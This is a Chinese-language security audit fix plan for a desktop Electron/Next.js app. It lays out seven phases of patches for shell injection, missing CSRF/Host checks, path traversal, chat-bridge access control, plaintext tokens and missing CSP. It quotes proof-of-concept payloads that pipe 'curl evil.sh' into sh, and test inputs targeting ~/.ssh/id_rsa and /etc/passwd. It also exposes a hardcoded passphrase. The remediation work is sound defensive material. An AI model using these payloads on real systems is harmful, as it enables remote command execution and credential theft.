# 安全审计修复方案

> 创建时间：2026-06-11
> 最后更新：2026-06-11
> 来源：2026-06-11 全项目安全审计（Electron 主进程 / 52 个 API 路由 / 凭证存储 / Bridge 远程 IM / 前端渲染 / 依赖）

## 背景与威胁模型

本次审计确认了一条**贯穿性架构缺陷**，它是几乎所有高危问题的放大器：

> 本地 Next.js 服务器的全部 API 路由**没有任何鉴权、没有 `middleware.ts`、没有 Origin / Host / CSRF 校验**（已确认 `src/middleware.ts` 不存在，`grep` Origin/CSRF 在 `src/app/api` 命中为 0）。

由此带来两类攻击者：

1. **同机任意进程**——可直接 `curl http://127.0.0.1:<port>/api/...` 调用任何接口。
2. **恶意网页（drive-by / CSRF + DNS rebinding）**——诱导用户打开一个网页，用 `fetch(url, {method:'POST', body})` 配 `text/plain` content-type（属于 CORS "简单请求"，无预检），请求即可送达本地服务器。浏览器虽读不到响应，但**副作用（命令执行、文件读写）已经发生**；DNS rebinding 可绕过端口/Host 限制。

因此审计中两处 Shell 注入从"本地提权"被放大为**可被网页驱动的无鉴权远程命令执行（RCE）**。修复方案按"先堵 RCE、再补边界鉴权、再逐面加固"的顺序分 7 个 Phase 推进。

## 漏洞 → Phase 映射

| 编号 | 严重度 | 位置 | Phase |
|------|--------|------|-------|
| C1 | Critical | `api/files/open` Shell 注入 | Phase 1 |
| H1 | High | `api/skills/marketplace/install`(+remove) Shell 注入 | Phase 1 |
| M1 | Medium | 全 API 无 CSRF/Origin 校验 + 服务器绑定 | Phase 2 |
| C2 | Critical | `api/files/raw` 越权读整个 `$HOME` | Phase 3 |
| H2 | High | `api/media/generate` 经 `referenceImagePaths` 任意读+外发 | Phase 3 |
| M3 | Medium | `api/uploads` 子串匹配路径门禁 | Phase 3 |
| M4 | Medium | `api/files/write` 缺省 baseDir 退化为 `$HOME` | Phase 3 |
| C3 | Critical | 飞书默认 `open` 策略：任意用户驱动 Agent | Phase 4 |
| C4 | Critical | 危险工具审批绑定聊天而非授权用户，可自我批准 | Phase 4 |
| H-微信 | High | 微信适配器 `isAuthorized` 无条件放行 | Phase 4 |
| H-QQ | High | QQ 适配器空名单=全放行 | Phase 4 |
| H3 | High | `api/bridge/settings` 明文返回第三方密钥 | Phase 5 |
| H4 | High | Bridge token 明文存 SQLite + DB 文件 0644 | Phase 5 |
| H5 | High | 主窗口无 CSP（terminal 等高权 IPC 无兜底） | Phase 6 |
| M2 | Medium | 主/登录窗口未开 `sandbox` | Phase 6 |
| 依赖 | High | electron / next / axios(飞书 SDK) 等已知 CVE | Phase 7 |

> 未列入主线的剩余项（M5 git cwd、M6 配置口令、M7 Bridge 入站限流）见文末「附录 A」。

## 状态

| Phase | 内容 | 状态 | 备注 |
|-------|------|------|------|
| Phase 1 | 消除两处无鉴权 RCE（C1 / H1） | 📋 待开始 | 最高优先，改动小、风险低 |
| Phase 2 | API 边界鉴权（M1：middleware + 绑 127.0.0.1） | 📋 待开始 | 中和跨站/rebinding 放大器 |
| Phase 3 | 文件接口统一作用域（C2 / H2 / M3 / M4） | 📋 待开始 | 复用既有 `assertRealPathInBase` |
| Phase 4 | Bridge 访问控制（C3 / C4 / 微信 / QQ） | 📋 待开始 | 全渠道 default-deny + 审批绑用户 |
| Phase 5 | Bridge 凭证保护（H3 / H4） | 📋 待开始 | 含 DB schema/迁移与 chmod |
| Phase 6 | Electron 渲染层加固（H5 / M2） | 📋 待开始 | 主窗口 CSP + sandbox |
| Phase 7 | 依赖升级（electron/next/axios 等） | 📋 待开始 | 升级后需跑完整打包验证 |

状态图例：📋 待开始 / 🔄 进行中 / ✅ 已完成 / ⏸ 暂缓

## 决策日志

- 2026-06-11：完成全项目安全审计，确认 4 Critical / 7 High（含依赖）/ 多项 Medium。确定以"先堵 RCE → 补边界鉴权 → 逐面加固 → 升级依赖"为修复顺序，落为本执行计划。
- 2026-06-11：决定 API 边界鉴权采用 **middleware 层 Origin/Host 校验**（而非给每个路由加 token），原因是 52 个路由逐一改造成本高且易漏；middleware 一处收口、对现有调用零侵入（同源请求自动通过）。
- 2026-06-11：决定 Bridge 全渠道统一为 **default-deny**，与 Telegram/Discord 现有"security-first"语义对齐，而非维持飞书/QQ/微信各自的 default-allow。

---

## Phase 1 — 消除两处无鉴权 RCE（C1 / H1）

**目标**：去掉用户输入流入 shell 的两条路径，使其在任何输入下都不可能被解释为命令。

### C1 — `api/files/open` Shell 命令注入

- **位置**：[src/app/api/files/open/route.ts:13-21](../../../src/app/api/files/open/route.ts)
- **根因**：`cmd = \`open "${path}"\`` 后 `exec(cmd)`；`path` 来自请求体，`"` 可闭合，`$(...)`/反引号/`;` 均被 shell 解释。
- **PoC**：`POST {"path":"x\"; curl evil.sh|sh; \""}`
- **修复**：改用 `execFile`（不经 shell），并对 `path` 做最小校验（绝对路径 + 存在）：

```ts
import { execFile } from 'child_process';
import fs from 'fs';
import path from 'path';

export async function POST(req: NextRequest) {
  const { path: target } = await req.json();
  if (!target || typeof target !== 'string' || !path.isAbsolute(target) || !fs.existsSync(target)) {
    return NextResponse.json({ error: 'Invalid path' }, { status: 400 });
  }
  const opener = process.platform === 'darwin' ? 'open'
    : process.platform === 'win32' ? 'explorer' : 'xdg-open';
  return new Promise<NextResponse>((resolve) => {
    execFile(opener, [target], (err) => {
      // 注意：Windows 的 explorer 即便成功也常返回非 0 退出码，需对 win32 放宽
      if (err && process.platform !== 'win32') {
        resolve(NextResponse.json({ error: err.message }, { status: 500 }));
      } else {
        resolve(NextResponse.json({ ok: true }));
      }
    });
  });
}
```

> `execFile(opener, [target])` 把 `target` 作为**单个 argv** 传入，shell 元字符不再被解释，根除注入。`isAbsolute + existsSync` 防止以 `-` 开头的参数被 `open`/`xdg-open` 当作 flag。

### H1 — `api/skills/marketplace/install`（及 `/remove`）Shell 注入

- **位置**：[src/app/api/skills/marketplace/install/route.ts:36-42](../../../src/app/api/skills/marketplace/install/route.ts)、`.../remove/route.ts`
- **根因**：`spawn("npx", args, { shell: true })`，`source`/`skill` 来自请求体进入 `args`；`shell:true` 下 argv 被拼成 shell 字符串，`{"source":"x; curl evil|sh #"}` 即注入。
- **修复（双层）**：
  1. **输入白名单（主控制）**——校验 `source`/`skill` 仅含安全字符，拒绝一切元字符：

```ts
const SAFE = /^[\w.@/+-]+$/;
if (!SAFE.test(source) || (skill && !SAFE.test(skill))) {
  return NextResponse.json({ error: 'invalid source/skill' }, { status: 400 });
}
```

  2. **去 shell（纵深防御）**——`shell:false` + 平台正确的二进制名：

```ts
const npx = process.platform === 'win32' ? 'npx.cmd' : 'npx';
const child = spawn(npx, args, { env: { ...process.env, NO_COLOR: '1', FORCE_COLOR: '0' }, shell: false });
```

> 之所以保留输入白名单：Windows 下即便 `shell:false`，Node 对 `.cmd` 仍可能隐式经 `cmd.exe`（CVE-2024-27980 类问题），存在参数注入残余风险。白名单是与平台无关的兜底。`remove/route.ts` 同样处理 `skill`。

### 验收标准（Phase 1）

- [ ] `files/open`、`skills/install`、`skills/remove` 三处不再出现 `exec(` 或 `shell: true`。
- [ ] 对 `path/source/skill` 注入构造（`; touch /tmp/x`、`$(...)`、反引号）返回 400 或安全执行，确认未落地副作用文件。
- [ ] 正常打开文件夹、正常安装/卸载一个 skill 的功能回归通过（CDP 实操：技能市场点 Install/Remove 看流式输出）。
- [ ] `npm run test` 通过。

---

## Phase 2 — API 边界鉴权（M1）

**目标**：在 middleware 层一次性拒绝跨站请求与非 loopback Host，关掉 drive-by/CSRF/DNS-rebinding 这个放大器；同时确保服务器只绑 `127.0.0.1`。

### 2.1 新增 `src/middleware.ts`

```ts
import { NextRequest, NextResponse } from 'next/server';

export const config = { matcher: '/api/:path*' };

const LOOPBACK = new Set(['127.0.0.1', 'localhost', '[::1]', '::1']);

export function middleware(req: NextRequest) {
  const host = req.headers.get('host') ?? '';
  const hostname = host.replace(/:\d+$/, '');

  // 1) Host 必须是 loopback —— 防 DNS rebinding（rebinding 后 IP 是 127.0.0.1，
  //    但浏览器发的 Host 仍是攻击者域名）
  if (hostname && !LOOPBACK.has(hostname)) {
    return NextResponse.json({ error: 'host not allowed' }, { status: 403 });
  }

  // 2) 若带 Origin，则其 host 必须等于本机 Host —— 防跨站简单请求 CSRF
  const origin = req.headers.get('origin');
  if (origin) {
    try {
      if (new URL(origin).host !== host) {
        return NextResponse.json({ error: 'cross-origin blocked' }, { status: 403 });
      }
    } catch {
      return NextResponse.json({ error: 'bad origin' }, { status: 403 });
    }
  }
  return NextResponse.next();
}
```

> 说明：同源 `fetch` 要么不带 `Origin`（GET/同源），要么 `Origin.host === Host`，均放行——对现有前端零侵入。跨站 POST 浏览器**必带** `Origin`，host 不匹配即被拦。SSE 流式路由经 `NextResponse.next()` 透传，不受影响。

### 2.2 服务器硬绑 127.0.0.1

- **现状**：[electron/main.ts:738](../../../electron/main.ts) 注入 `HOSTNAME=127.0.0.1`，但 `.next/standalone/server.js` 缺省是公网 `0.0.0.0`——绑定正确性完全依赖这一条 env 注入，一旦被重构/遗漏即对全网暴露带文件/终端/Agent 能力的本地 API。
- **修复**：不只依赖 env——在服务器 bootstrap 把 `hostname` 硬编码默认 `127.0.0.1`，或在 main 进程启动后断言绑定地址为 loopback，非 loopback 直接 fail-fast。

### 验收标准（Phase 2）

- [ ] 携带 `Origin: http://evil.com` 的跨站 POST 被 403；同源（无 Origin 或 Origin=本机）请求正常。
- [ ] 携带 `Host: evil.com:<port>` 的请求被 403。
- [ ] 应用全功能回归（聊天、文件树、设置、媒体）无因 middleware 误伤——重点验证 SSE 流、媒体 `serve`/`raw` 仍可加载。
- [ ] 打包版确认 Next 服务器实际监听 `127.0.0.1`（`lsof -i` / netstat 验证非 `0.0.0.0`）。

---

## Phase 3 — 文件接口统一作用域（C2 / H2 / M3 / M4）

**目标**：所有"按路径读/写"的接口统一改为"会话派生 baseDir + realpath 校验"，复用 `src/lib/files.ts` 既有 helper，杜绝越界与符号链接逃逸。缺陷都出在**绕过**这些 helper 的路由上。

**可复用 helper**（[src/lib/files.ts](../../../src/lib/files.ts)）：

- `assertRealPathInBase(resolvedPath, baseDir)`（416 行，async，解析符号链接后校验仍在 base 内）
- `assertWritablePath(resolvedPath, baseDir?)`（369 行）、`assertNoSymlinkInChain`（482 行）、`isBlockedPath`（335 行）
- **正确锚定参考实现**：[src/app/api/media/serve/route.ts](../../../src/app/api/media/serve/route.ts)（`resolved.startsWith(canonicalDir + path.sep) && resolved !== canonicalDir`）

### C2 — `api/files/raw` 越权读整个 `$HOME`

- **位置**：[src/app/api/files/raw/route.ts:102-111](../../../src/app/api/files/raw/route.ts)，唯一边界是 `os.homedir()`，无会话作用域、无符号链接校验。可读 `~/.ssh/id_rsa`、`~/.codepilot/codepilot.db`（含密钥）、`~/.aws/credentials`、`~/.claude/*`。
- **修复**：要求请求带 `sessionId` → 从会话记录推导 `baseDir`（与 `api/files/serve` 一致）→ `await assertRealPathInBase(resolved, baseDir)`，越界抛错返回 403。

### H2 — `api/media/generate` 经 `referenceImagePaths` 任意读 + 外发

- **位置**：[src/lib/image-generator.ts:292-301](../../../src/lib/image-generator.ts)，任意绝对路径被读取、base64 后**发送到所配置的远程图像服务商**（攻击者可先建指向自己服务器的 provider 构成外泄通道）。
- **修复**：参考路径相对会话工作目录解析；`assertRealPathInBase` 校验；拒绝越界绝对路径；限制图片扩展名白名单（`.png/.jpg/.jpeg/.webp/.gif`）。

### M3 — `api/uploads` 子串匹配路径门禁

- **位置**：[src/app/api/uploads/route.ts:37-45](../../../src/app/api/uploads/route.ts)，`resolved.includes('.codepilot-uploads')` 是**子串**匹配而非锚定根。
- **修复**：改成 `media/serve` 的规范根锚定：`resolved.startsWith(canonicalRoot + path.sep)`；加 `fs.realpath` 符号链接解析；按会话作用域。

### M4 — `api/files/write` 缺省 baseDir 退化为 `$HOME`

- **位置**：[src/app/api/files/write/route.ts:53,72](../../../src/app/api/files/write/route.ts) → [src/lib/files.ts:369-386](../../../src/lib/files.ts)，省略 `baseDir` 时回退 `os.homedir()`，可写 `~/.zshrc`、`~/.claude/*` 实现持久化（符号链接与 blocked-dir 防护本身是好的，问题是缺省作用域过宽 + 无鉴权）。
- **修复**：`baseDir`/`sessionId` 必填，缺失即 400，不再回退 `$HOME`；显式拒绝写入点文件配置目录（`.zshrc`/`.bashrc`/`.claude`/`.codepilot`）。

### 验收标准（Phase 3）

- [ ] 四个接口在缺少有效 `sessionId`/`baseDir` 时拒绝，不再以 `$HOME` 为默认作用域。
- [ ] `path=../../../../etc/passwd`、指向 base 外的符号链接、`referenceImagePaths:["/Users/x/.ssh/id_rsa"]` 均被 403。
- [ ] 正常会话内的文件预览/读取/写入/参考图生成回归通过（CDP）。
- [ ] `npm run test`（含 `src/lib/files.ts` 既有用例）通过。

---

## Phase 4 — Bridge 访问控制（C3 / C4 / 微信 / QQ）

**目标**：全渠道改 **default-deny**（与 Telegram/Discord 对齐）；危险工具审批绑定**授权用户身份**而非"同一聊天"。

### C3 — 飞书默认 `open` 策略

- **位置**：[src/lib/channels/feishu/config.ts:24-25](../../../src/lib/channels/feishu/config.ts) 默认 `dmPolicy/groupPolicy='open'`；[src/lib/channels/feishu/policy.ts:41](../../../src/lib/channels/feishu/policy.ts) `allowFrom` 为空时 `return true`，群默认 `return true`。
- **修复**：
  - config 默认改 `'disabled'`（或 `'allowlist'`）。
  - policy.ts:41 `if (config.allowFrom.length === 0) return true;` → `return false;`（空名单=拒绝）。
  - 飞书插件启动前要求存在非空白名单，否则不启动该渠道。

### C4 — 审批绑定聊天而非授权用户，可自我批准

- **位置**：[src/lib/bridge/permission-broker.ts:400-409](../../../src/lib/bridge/permission-broker.ts)（回调只校验 `chatId/messageId` 匹配），自我批准配合 `Allow Session`（[:441-455](../../../src/lib/bridge/permission-broker.ts)）后整会话同类工具自动放行。文本兜底 `/perm allow <id>`（[bridge-manager.ts:1085-1102](../../../src/lib/bridge/bridge-manager.ts)）跳过 messageId 校验，问题更重。
- **修复**：
  - 在权限链路记录**发起/授权用户 userId**，回调时要求 `callback.userId ∈ 白名单`（理想情况下等于发起本轮对话的用户）。
  - 群聊仅允许白名单操作者批准。
  - `/perm` 文本审批同样校验 userId，不能只校验 chatId。

### H-微信 — 适配器无条件放行

- **位置**：[src/lib/bridge/adapters/weixin-adapter.ts:250-258](../../../src/lib/bridge/adapters/weixin-adapter.ts)，`isAuthorized` 直接 `return true`。
- **修复**：读取 per-account 允许用户名单（注释声称存于 settings 但从未读取），空名单 default-deny。

### H-QQ — 空名单=全放行

- **位置**：[src/lib/bridge/adapters/qq-adapter.ts:191-196](../../../src/lib/bridge/adapters/qq-adapter.ts)，`bridge_qq_allowed_users` 为空时 `return true`。
- **修复**：空名单 default-deny，与 Discord/Telegram 一致。

### 验收标准（Phase 4）

- [ ] 飞书/QQ/微信在未配置白名单时，非授权用户消息被拒绝（不进入 Agent）。
- [ ] 非授权用户点击/输入审批（含 `/perm allow`）被拒绝；仅授权用户可批准。
- [ ] 已配置白名单的授权用户全链路（消息→Agent→审批→执行）回归通过。
- [ ] `npm run test` 通过（关注 `policy.ts`、各 adapter 既有用例）。

---

## Phase 5 — Bridge 凭证保护（H3 / H4）

**目标**：Bridge 第三方密钥加密存储、响应打码、DB 文件收紧权限。

### H3 — `api/bridge/settings` 明文返回密钥

- **位置**：[src/app/api/bridge/settings/route.ts:48-61](../../../src/app/api/bridge/settings/route.ts)，GET 原样返回 `bridge_feishu_app_secret`/`bridge_discord_bot_token`/`bridge_qq_app_secret`。
- **修复**：GET 对密钥字段打码（沿用 `api/settings/telegram`、`api/providers` 的 `'***'+slice(-8)` 模式）；PUT 忽略打码占位值（不把 `***` 写回）。

### H4 — Bridge token 明文存 SQLite + DB 文件 0644

- **位置**：[src/lib/db.ts:32-37](../../../src/lib/db.ts) `SENSITIVE_SETTINGS` 仅含 anthropic/openai；bridge token 走 `setSetting` 时跳过加密；`weixin_accounts.token` 走裸 SQL；`codepilot.db` 实测 `-rw-r--r--`。
- **修复**：
  1. **加密键值 token**——把以下键加入 `SENSITIVE_SETTINGS`（[db.ts:32](../../../src/lib/db.ts)）：`telegram_bot_token`、`bridge_discord_bot_token`、`bridge_feishu_app_secret`、`bridge_qq_app_secret`（及未来 `bridge_slack_*`）。`setSetting/getSetting`（db.ts:1490-1499）会自动 seal/open，无需改调用点。
  2. **加密列 token**——`weixin_accounts.token` 走 seal 写 / open 读（仿 `hydrateProvider`），并扩展 `reSealSensitiveColumns`（db.ts:1029-1049 一带）覆盖该列。
  3. **重封迁移**——已有 `isSealed` 守护，迁移可重入、自愈半迁移；启动时对上述键/列跑一次 re-seal，旧明文行自动转密文。
  4. **收紧文件权限**——建库后 `fs.chmodSync(DB_PATH, 0o600)`（[db.ts:126](../../../src/lib/db.ts)；Windows 上 no-op，与 `storage.ts` 既有模式一致），同时 chmod `-wal`/`-shm`。

> 自查触及点：**DB schema/迁移**（CLAUDE.md「改动自查」第 2 项）——本 Phase 改动 `db.ts`，需确认迁移幂等、对存量库平滑。

### 验收标准（Phase 5）

- [ ] 写入 bridge token 后，用 `sqlite3` 直接查 `settings`/`weixin_accounts` 看到的是密文而非明文。
- [ ] `GET /api/bridge/settings` 返回打码值；PUT 打码占位值不覆盖真实密钥。
- [ ] `codepilot.db`/`-wal`/`-shm` 权限为 `600`（macOS/Linux）。
- [ ] 存量明文库升级后自动转密文且 Bridge 仍能正常连接（重封迁移幂等）。
- [ ] `npm run test` 通过。

---

## Phase 6 — Electron 渲染层加固（H5 / M2）

**目标**：给主窗口加严格 CSP 作为"渲染层 XSS → RCE"的兜底；主/登录窗口开启 sandbox。前端渲染本身审计为良好，此 Phase 是纵深防御。

### H5 — 主窗口无 CSP

- **背景**：主渲染进程经 `electronAPI` 暴露 `terminal.create/write`（≈任意 shell）、`shell.openPath`、`artifact:export-long-shot`（任意写文件）等高权 IPC（[electron/preload.ts:64-83](../../../electron/preload.ts)）；主窗口**完全没有 CSP**（仅登录窗口 `electron/login/index.html:5` 有）。任何渲染层 XSS 回归即 RCE，无兜底。
- **修复**：在 main 进程用 `session.defaultSession.webRequest.onHeadersReceived` 给主窗口注入严格 CSP：

```ts
session.defaultSession.webRequest.onHeadersReceived((details, cb) => {
  cb({
    responseHeaders: {
      ...details.responseHeaders,
      'Content-Security-Policy': [
        "default-src 'self'; script-src 'self'; object-src 'none'; frame-ancestors 'none'; base-uri 'none'",
        // connect-src 按实际后端/SSE 主机收敛；dev 下需加 ws: 供 HMR
      ],
    },
  });
});
```

> 落地前需盘点应用实际依赖的内联脚本/样式与 `connect-src` 目标（后端 API、Sentry、SSE）。登录窗口已有正确 CSP，可对照其严格度。`artifact`/`widget` 导出窗口已正确硬化（`sandbox:true` + 独立 partition + 拒绝导航），无需改动。

### M2 — 主/登录窗口未开 sandbox

- **位置**：[electron/main.ts:1052](../../../electron/main.ts)（主窗口）、[electron/auth/login-window.ts:82](../../../electron/auth/login-window.ts)（登录窗口）——`webPreferences` 设了 `contextIsolation`/`nodeIntegration` 但漏了 `sandbox:true`（导出窗口 `main.ts:1691/1774` 反而设了，说明已知此开关）。
- **修复**：两窗口 `webPreferences` 加 `sandbox: true`。preload 仅用 `ipcRenderer`/`webUtils`/`contextBridge`，均兼容 sandbox，风险低；启用后需回归 terminal/通知/对话流。

### 验收标准（Phase 6）

- [ ] CDP 验证主窗口响应头含预期 CSP；console 无被 CSP 误杀的资源/脚本报错；应用功能（聊天/渲染/widget/终端）正常。
- [ ] 主/登录窗口 `sandbox:true` 后，登录 OAuth、终端创建/输入、桌面通知回归通过。
- [ ] 构造一段含 `<img src=x onerror=...>` 的 AI 内容验证 CSP 阻断脚本执行（不触达 `electronAPI`）。
- [ ] `npm run test:smoke`（UI 改动）通过。

---

## Phase 7 — 依赖升级

**目标**：处理 `npm audit` 中**真正可达**的高危项；忽略 `streamdown→mermaid→chevrotain/langium/lodash-es` 一类传递噪声。

| 包 | 当前 | 风险 | 动作 |
|----|------|------|------|
| electron | 40.2.1 | 多个 high（contextIsolation bypass、IPC spoof、UAF…） | 升至最新 40.x 补丁版 |
| next | 16.2.1 | 多个 high（DoS、middleware bypass、CSP nonce XSS） | 升至最新 16.x 补丁版 |
| axios（经 `@larksuiteoapi`） | 传递 | 一批 high（SSRF / proxy 凭证泄漏 / 原型污染） | 升飞书 SDK 或 `overrides` 钉 axios |
| dompurify | 3.3.3 | moderate（FORBID_TAGS bypass 等） | 升级 |
| protobufjs / shell-quote（经 `concurrently`，devDep） | 传递 | critical | devDep 风险低，建议一并升 |

### 验收标准（Phase 7）

- [ ] `npm audit` critical/high 显著下降；剩余项为已确认不可达的传递噪声并记录在案。
- [ ] electron 升级后**完整执行一次打包流程**（`scripts/after-pack.js` 重编 better-sqlite3 ABI）并验证 DMG 产物可用（CLAUDE.md 发版纪律）。
- [ ] `npm run test` + `npm run test:e2e` 通过。

---

## 总体测试与验证纪律（遵循 CLAUDE.md）

- 每个 Phase 提交前至少 `npm run test` 通过；涉及 UI 的（Phase 6、部分 Phase 4 审批卡片）额外 `npm run test:smoke`。
- UI/交互改动用 **chrome-devtools MCP** 实操验证 + 截图 + 检查 console（CLAUDE.md「UI 改动必须用 CDP 验证」）。
- 本地 dev 无登录体系，managed/Bridge 下发数据为空——Bridge 与凭证相关验证用 **mock 数据**验证逻辑正确性，结论需注明此前提。
- 测试用 dev server 提交前**定向关闭**占用端口的进程，不盲杀 node。
- 每个 Phase 一个原子提交，conventional commits（多为 `fix(security): ...`），body 说明根因与影响范围。
- 全部完成后：按 CLAUDE.md「功能文档」要求，在 `docs/handover/` 补一份安全加固交接文档，并把本计划移至 `docs/exec-plans/completed/`。

## 附录 A — 未列入主线的剩余项

下列为审计发现但未纳入本次 7-Phase 主线的项，建议后续单独排期：

- **M5 — git 接口 `cwd` 完全由请求控制**（`src/app/api/git/*`、`src/lib/git/service.ts`）：仅校验 `isAbsolute`，可对任意仓库 `push`/读历史；`commit-detail` 的 `sha` 未校验。用的是 `execFile` 故无 RCE，但属"无鉴权操作任意仓库"。修复：`cwd` 限定会话工作目录集合；`sha` 校验 `^[0-9a-fA-F]{4,40}$`。Phase 2 的 middleware 可先降低其可达性。
- **M6 — 内置配置口令硬编码 + 无盐 SHA-256 KDF**（[electron/auth/config-crypto.ts:23](../../../electron/auth/config-crypto.ts)，`DEFAULT_PASSPHRASE='ZJH2026'`，且明文写进了 `docs/`）：用于解密下发的 managed 凭证，提取 bundle 即可解密。修复：口令移出源码改 build-time env 注入；从文档移除明文；长期改 salted KDF（scrypt/Argon2）/服务端 per-user 密钥。
- **M7 — Bridge 入站无限流**（`src/lib/bridge/security/rate-limiter.ts` 仅用于出站）：攻击者用大量不同 chatId 可拉起无上限并发 SDK 会话（每个持 600s 锁），耗配额/CPU。修复：入站加 per-user/per-chat 限流 + 全局并发会话上限。
- **审计为良好、无需改动的项**（备查）：Markdown 渲染（streamdown 默认带 `rehype-sanitize`）、生成式 UI widget（iframe `sandbox="allow-scripts"` 无 `allow-same-origin` + `connect-src 'none'`）、HTML artifact 预览（`sandbox=""`）、Mermaid（`securityLevel:'strict'`）、provider key 加密与打码、OAuth 回调服务器（绑 127.0.0.1:0 + state 校验）、自定义更新器（HTTPS + SHA-256 校验）。
